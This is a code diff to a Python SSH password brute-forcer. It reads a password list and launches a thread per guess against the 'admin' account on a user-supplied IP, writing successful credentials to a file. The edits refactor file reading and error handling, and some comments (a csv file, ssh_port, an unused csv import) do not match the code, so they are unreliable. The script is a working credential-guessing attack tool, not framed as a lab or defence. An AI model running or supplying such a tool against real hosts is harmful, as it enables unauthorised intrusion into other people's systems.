@@ -1,3 +1,4 @@
+import csv
 import ipaddress
 import threading
 import time
@@ -21,10 +22,13 @@ def ssh_connect(host, username, password):
             fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
             return True
     except AuthenticationException:
-        print(f"Username - {username} and Password - {password} is Incorrect.")
+        print(f"Username - {username} and Password - {password} is incorrect.")
         return False
-    except ssh_exception.SSHException:
-        print("**** Attempting to connect - Rate limiting on server ****")
+    except ssh_exception.SSHException as e:
+        if "timed out" in str(e):
+            print(f"Connection to {host} timed out.")
+        else:
+            print(f"Failed to connect to {host}: {str(e)}")
         return False
 
 
@@ -42,22 +46,34 @@ def get_ip_address():
             print("Please enter a valid ip address.")
 
 
+# This function reads passwords from a file.
+def read_passwords_file(filename):
+    passwords = []
+    with open(filename, "r") as f:
+        for line in f:
+            password = line.strip()
+            if password:
+                passwords.append(password)
+    return passwords
+
+
 # The program will start in the main function.
 def main():
     logging.getLogger('paramiko.transport').addHandler(NullHandler())
+    # To keep to functional programming standards we declare ssh_port inside a function.
+    list_file = "passwords.txt"
     host = get_ip_address()
-    with open("passwords.txt", "r") as f:
-        passwords = f.readlines()
-    # This function reads a txt file with passwords.
+    passwords = read_passwords_file(list_file)
+    # This function reads a csv file with passwords.
     for password in passwords:
         # We create a thread on the ssh_connect function, and send the correct arguments to it.
-        t = threading.Thread(target=ssh_connect, args=(host, 'admin', password.strip(),))
+        t = threading.Thread(target=ssh_connect, args=(host, 'admin', password,))
         # We start the thread.
         t.start()
         # We leave a small time between starting a new connection thread.
         time.sleep(0.2)
 
 
-# We run the main function where execution starts.
+#  We run the main function where execution starts.
 if __name__ == "__main__":
     main()
